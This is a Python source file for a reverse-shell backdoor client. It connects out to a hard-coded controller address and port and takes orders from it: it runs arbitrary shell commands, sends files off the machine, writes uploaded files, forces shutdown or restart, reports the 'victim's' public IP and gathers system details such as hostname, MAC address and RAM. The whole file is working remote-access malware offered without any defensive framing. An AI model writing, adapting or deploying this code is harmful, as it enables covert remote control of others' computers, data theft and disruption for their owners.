try:
    from requests import get
    import platform, re, uuid, pickle, psutil, logging
    import subprocess
    import socket
    import os
    import pickle
    from colorama import *
    init()
    import base64
    def execute_sys_command(command):
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        data = output + output_error
        connection.send(data)


    def change_dir(dir):
        os.chdir(dir)
        return "[+] Changing working directory to " + dir


    host = "192.168.1.6"
    port = 2008
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((host, port))


    def read_file(file):
        with open(file, "rb") as to_upload:
            info = to_upload.read()
        connection.send(info)
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(content)
        connection.send("[+] Upload Successful".encode())

    while True:
        recieved = connection.recv(1048576)
        command = recieved.decode()
        if "ChangeDir " in command:
            directory = command.replace("ChangeDir ", "")
            result = change_dir(dir=directory)
            result = result.encode()
            connection.send(result)
        elif command == "Shutdown":
            success = "[+] Target going to shutdown "
            success = success.encode()
            connection.send(success)
            subprocess.call("shutdown /s /f", shell=True)
        elif command == "Restart":
            success = "[+] Target going to restart "
            success = success.encode()
            connection.send(success)
            subprocess.call("shutdown /r /f", shell=True)
        elif command == "Exit.session":
            closing = "[+] Session is going to close"
            closing = closing.encode()
            connection.send(closing)
            connection.close()
        elif command == "PublicIp":
            ip_addr = get('https://api.ipify.org').text
            ip = "[+] The victim's public ip is " + ip_addr
            ip = ip.encode()
            connection.send(ip)
        elif command == "SysInfo" or command == "Sysinfo" or command == "sysinfo" or command == "sysInfo":
            def getSystemInfo():
                try:
                    os = "Platform = " + platform.system()
                    release = ", Platform release = " + platform.release()
                    version = ", Platform version = " + platform.version()
                    archit = ", Architecture = " + platform.machine()
                    hostname = ", Hostname = " + socket.gethostname()
                    ip = ", Ip address = " + socket.gethostbyname(socket.gethostname())
                    mac = ", Mac address = " + ':'.join(re.findall('..', '%012x' % uuid.getnode()))
                    processor = ", Processor = " + platform.processor()
                    ram = ", Ram = " + str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
                    full = os + release + version + archit + hostname + ip + mac + processor + ram
                    full = full.encode()
                    connection.send(full)

                except Exception as e:
                    logging.exception(e)


            getSystemInfo()
        elif "Download " in command:
            file = command.replace("Download ", "")
            read_file(file=file)
        elif "Upload " in command:
            name = command.replace("Upload ", "")
            result = connection.recv(1048576)
            content = result
            write_file(name, content=content)
        else:
            execute_sys_command(command=command)
except KeyboardInterrupt:
    print(Fore.RED)
    print("KeyBoardInterrupt")
    print(Fore.RESET)
    quit()
except ConnectionAbortedError:
    print(Fore.RED)
    print("Connection was aborted")
    print(Fore.RESET)
    quit()
except ConnectionRefusedError:
    print(Fore.RED)
    print("Connection refused by target")
    print(Fore.RESET)
    quit()